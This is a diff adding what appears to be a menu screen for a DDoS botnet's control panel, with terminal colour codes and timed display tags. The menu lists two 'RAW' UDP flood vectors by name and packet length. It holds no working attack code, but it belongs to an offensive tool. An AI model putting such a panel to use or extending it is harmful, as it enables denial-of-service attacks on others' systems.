@@ -1,0 +1,5 @@
+<<$clear>>
+[8;51;109t
+[38;2;255;255;255m[[38;2;96;179;250m RAW Vectors [38;2;255;255;255m][0m <<$sleep(30)>>
+  │ udp-botnet            [[38;2;255;0;0mRAW[0m] Sends raw UDP attack using LEN=1400 <<$sleep(30)>>
+  │ pps-botnet            [[38;2;255;0;0mRAW[0m] Sends raw UDPPLAIN attack using LEN=1 <<$sleep(30)>>
